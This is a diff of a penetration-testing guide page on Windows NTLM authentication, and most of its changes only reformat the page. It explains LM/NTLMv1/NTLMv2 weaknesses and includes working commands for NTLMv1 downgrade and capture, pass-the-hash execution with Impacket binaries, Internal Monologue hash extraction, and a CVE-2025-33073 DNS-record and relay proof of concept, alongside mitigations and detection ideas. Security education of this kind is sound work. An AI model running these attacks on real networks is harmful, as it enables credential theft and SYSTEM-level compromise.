@@ -1,7 +1,6 @@
 # NTLM
 
-{{#include ../../banners/hacktricks-training.md}}
-
+\{{#include ../../banners/hacktricks-training.md\}}
 
 ## Basic Information
 
@@ -15,10 +14,10 @@ Support for the authentication protocols - LM, NTLMv1, and NTLMv2 - is facilitat
 
 **Key Points**:
 
-- LM hashes are vulnerable and an empty LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) signifies its non-use.
-- Kerberos is the default authentication method, with NTLM used only under certain conditions.
-- NTLM authentication packets are identifiable by the "NTLMSSP" header.
-- LM, NTLMv1, and NTLMv2 protocols are supported by the system file `msv1\_0.dll`.
+* LM hashes are vulnerable and an empty LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) signifies its non-use.
+* Kerberos is the default authentication method, with NTLM used only under certain conditions.
+* NTLM authentication packets are identifiable by the "NTLMSSP" header.
+* LM, NTLMv1, and NTLMv2 protocols are supported by the system file `msv1\_0.dll`.
 
 ## LM, NTLMv1 and NTLMv2
 
@@ -28,7 +27,7 @@ You can check and configure which protocol will be used:
 
 Execute _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. There are 6 levels (from 0 to 5).
 
-![](<../../images/image (919).png>)
+![](<../../../.gitbook/assets/image (919).png>)
 
 ### Registry
 
@@ -72,11 +71,11 @@ The **hash NT (16bytes)** is divided in **3 parts of 7bytes each** (7B + 7B + (2
 
 **Problems**:
 
-- Lack of **randomness**
-- The 3 parts can be **attacked separately** to find the NT hash
-- **DES is crackable**
-- The 3º key is composed always by **5 zeros**.
-- Given the **same challenge** the **response** will be **same**. So, you can give as a **challenge** to the victim the string "**1122334455667788**" and attack the response used **precomputed rainbow tables**.
+* Lack of **randomness**
+* The 3 parts can be **attacked separately** to find the NT hash
+* **DES is crackable**
+* The 3º key is composed always by **5 zeros**.
+* Given the **same challenge** the **response** will be **same**. So, you can give as a **challenge** to the victim the string "**1122334455667788**" and attack the response used **precomputed rainbow tables**.
 
 ### NTLMv1 attack
 
@@ -84,9 +83,9 @@ Nowadays is becoming less common to find environments with Unconstrained Delegat
 
 You could abuse some credentials/sessions you already have on the AD to **ask the printer to authenticate** against some **host under your control**. Then, using `metasploit auxiliary/server/capture/smb` or `responder` you can **set the authentication challenge to 1122334455667788**, capture the authentication attempt, and if it was done using **NTLMv1** you will be able to **crack it**.\
 If you are using `responder` you could try to **use the flag `--lm`** to try to **downgrade** the **authentication**.\
-_Note that for this technique the authentication must be performed using NTLMv1 (NTLMv2 is not valid)._
+&#xNAN;_&#x4E;ote that for this technique the authentication must be performed using NTLMv1 (NTLMv2 is not valid)._
 
-Remember that the printer will use the computer account during the authentication, and computer accounts use **long and random passwords** that you **probably won't be able to crack** using common **dictionaries**. But the **NTLMv1** authentication **uses DES** ([more info here](#ntlmv1-challenge)), so using some services specially dedicated to cracking DES you will be able to crack it (you could use [https://crack.sh/](https://crack.sh) or [https://ntlmv1.com/](https://ntlmv1.com) for example).
+Remember that the printer will use the computer account during the authentication, and computer accounts use **long and random passwords** that you **probably won't be able to crack** using common **dictionaries**. But the **NTLMv1** authentication **uses DES** ([more info here](./#ntlmv1-challenge)), so using some services specially dedicated to cracking DES you will be able to crack it (you could use [https://crack.sh/](https://crack.sh) or [https://ntlmv1.com/](https://ntlmv1.com) for example).
 
 ### NTLMv1 attack with hashcat
 
@@ -178,7 +177,7 @@ NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 
 The **challenge length is 8 bytes** and **2 responses are sent**: One is **24 bytes** long and the length of the **other** is **variable**.
 
-**The first response** is created by ciphering using **HMAC_MD5** the **string** composed by the **client and the domain** and using as **key** the **hash MD4** of the **NT hash**. Then, the **result** will by used as **key** to cipher using **HMAC_MD5** the **challenge**. To this, **a client challenge of 8 bytes will be added**. Total: 24 B.
+**The first response** is created by ciphering using **HMAC\_MD5** the **string** composed by the **client and the domain** and using as **key** the **hash MD4** of the **NT hash**. Then, the **result** will by used as **key** to cipher using **HMAC\_MD5** the **challenge**. To this, **a client challenge of 8 bytes will be added**. Total: 24 B.
 
 The **second response** is created using **several values** (a new client challenge, a **timestamp** to avoid **replay attacks**...)
 
@@ -210,10 +209,10 @@ You can obtain code execution in Windows machines using Pass-the-Hash from Linux
 
 You can download[ impacket binaries for Windows here](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).
 
-- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
-- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
-- **atexec.exe** (In this case you need to specify a command, cmd.exe and powershell.exe are not valid to obtain an interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
-- There are several more Impacket binaries...
+* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
+* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
+* **atexec.exe** (In this case you need to specify a command, cmd.exe and powershell.exe are not valid to obtain an interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
+* There are several more Impacket binaries...
 
 ### Invoke-TheHash
 
@@ -265,10 +264,7 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 
 ### Manual Windows remote execution with username and password
 
-
-{{#ref}}
-../lateral-movement/
-{{#endref}}
+\{{#ref\}} ../lateral-movement/ \{{#endref\}}
 
 ## Extracting credentials from a Windows Host
 
@@ -276,7 +272,7 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 
 ## Internal Monologue attack
 
-The Internal Monologue Attack is a stealthy credential extraction technique that allows an attacker to retrieve NTLM hashes from a victim's machine **without interacting directly with the LSASS process**. Unlike Mimikatz, which reads hashes directly from memory and is frequently blocked by endpoint security solutions or Credential Guard, this attack leverages **local calls to the NTLM authentication package (MSV1_0) via the Security Support Provider Interface (SSPI)**. The attacker first **downgrades NTLM settings** (e.g., LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) to ensure that NetNTLMv1 is permitted. They then impersonate existing user tokens obtained from running processes and trigger NTLM authentication locally to generate NetNTLMv1 responses using a known challenge.
+The Internal Monologue Attack is a stealthy credential extraction technique that allows an attacker to retrieve NTLM hashes from a victim's machine **without interacting directly with the LSASS process**. Unlike Mimikatz, which reads hashes directly from memory and is frequently blocked by endpoint security solutions or Credential Guard, this attack leverages **local calls to the NTLM authentication package (MSV1\_0) via the Security Support Provider Interface (SSPI)**. The attacker first **downgrades NTLM settings** (e.g., LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) to ensure that NetNTLMv1 is permitted. They then impersonate existing user tokens obtained from running processes and trigger NTLM authentication locally to generate NetNTLMv1 responses using a known challenge.
 
 After capturing these NetNTLMv1 responses, the attacker can quickly recover the original NTLM hashes using **precomputed rainbow tables**, enabling further Pass-the-Hash attacks for lateral movement. Crucially, the Internal Monologue Attack remains stealthy because it doesn't generate network traffic, inject code, or trigger direct memory dumps, making it harder for defenders to detect compared to traditional methods like Mimikatz.
 
@@ -284,37 +280,35 @@ If NetNTLMv1 is not accepted—due to enforced security policies, then the attac
 
 To handle this case, the Internal Monologue tool was updated: It dynamically acquires a server token using `AcceptSecurityContext()` to still **capture NetNTLMv2 responses** if NetNTLMv1 fails. While NetNTLMv2 is much harder to crack, it still opens a path for relay attacks or offline brute-force in limited cases.
 
-The PoC can be found in **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.
+The PoC can be found in [**https://github.com/eladshamir/Internal-Monologue**](https://github.com/eladshamir/Internal-Monologue).
 
 ## NTLM Relay and Responder
 
 **Read more detailed guide on how to perform those attacks here:**
 
-
-{{#ref}}
-../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
-{{#endref}}
+\{{#ref\}} ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md \{{#endref\}}
 
 ## Parse NTLM challenges from a network capture
 
 **You can use** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
 
-## NTLM & Kerberos *Reflection* via Serialized SPNs (CVE-2025-33073)
+## NTLM & Kerberos _Reflection_ via Serialized SPNs (CVE-2025-33073)
 
-Windows contains several mitigations that try to prevent *reflection* attacks where an NTLM (or Kerberos) authentication that originates from a host is relayed back to the **same** host to gain SYSTEM privileges.  
+Windows contains several mitigations that try to prevent _reflection_ attacks where an NTLM (or Kerberos) authentication that originates from a host is relayed back to the **same** host to gain SYSTEM privileges.
 
-Microsoft broke most public chains with MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) and later patches, however **CVE-2025-33073** shows that the protections can still be bypassed by abusing how the **SMB client truncates Service Principal Names (SPNs)** that contain *marshalled* (serialized) target-info.
+Microsoft broke most public chains with MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) and later patches, however **CVE-2025-33073** shows that the protections can still be bypassed by abusing how the **SMB client truncates Service Principal Names (SPNs)** that contain _marshalled_ (serialized) target-info.
 
 ### TL;DR of the bug
-1. An attacker registers a **DNS A-record** whose label encodes a marshalled SPN – e.g.
-   `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
+
+1. An attacker registers a **DNS A-record** whose label encodes a marshalled SPN – e.g. `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
 2. The victim is coerced to authenticate to that hostname (PetitPotam, DFSCoerce, etc.).
 3. When the SMB client passes the target string `cifs/srv11UWhRCAAAAA…` to `lsasrv!LsapCheckMarshalledTargetInfo`, the call to `CredUnmarshalTargetInfo` **strips** the serialized blob, leaving **`cifs/srv1`**.
-4. `msv1_0!SspIsTargetLocalhost` (or the Kerberos equivalent) now considers the target to be *localhost* because the short host part matches the computer name (`SRV1`).
+4. `msv1_0!SspIsTargetLocalhost` (or the Kerberos equivalent) now considers the target to be _localhost_ because the short host part matches the computer name (`SRV1`).
 5. Consequently, the server sets `NTLMSSP_NEGOTIATE_LOCAL_CALL` and injects **LSASS’ SYSTEM access-token** into the context (for Kerberos a SYSTEM-marked subsession key is created).
 6. Relaying that authentication with `ntlmrelayx.py` **or** `krbrelayx.py` gives full SYSTEM rights on the same host.
 
 ### Quick PoC
+
 ```bash
 # Add malicious DNS record
 dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
@@ -333,17 +327,20 @@ krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
 ```
 
 ### Patch & Mitigations
+
 * KB patch for **CVE-2025-33073** adds a check in `mrxsmb.sys::SmbCeCreateSrvCall` that blocks any SMB connection whose target contains marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
 * Enforce **SMB signing** to prevent reflection even on unpatched hosts.
 * Monitor DNS records resembling `*<base64>...*` and block coercion vectors (PetitPotam, DFSCoerce, AuthIP...).
 
 ### Detection ideas
+
 * Network captures with `NTLMSSP_NEGOTIATE_LOCAL_CALL` where client IP ≠ server IP.
 * Kerberos AP-REQ containing a subsession key and a client principal equal to the hostname.
 * Windows Event 4624/4648 SYSTEM logons immediately followed by remote SMB writes from the same host.
 
 ## References
+
 * [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
 * [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
 
-{{#include ../../banners/hacktricks-training.md}}
+\{{#include ../../banners/hacktricks-training.md\}}
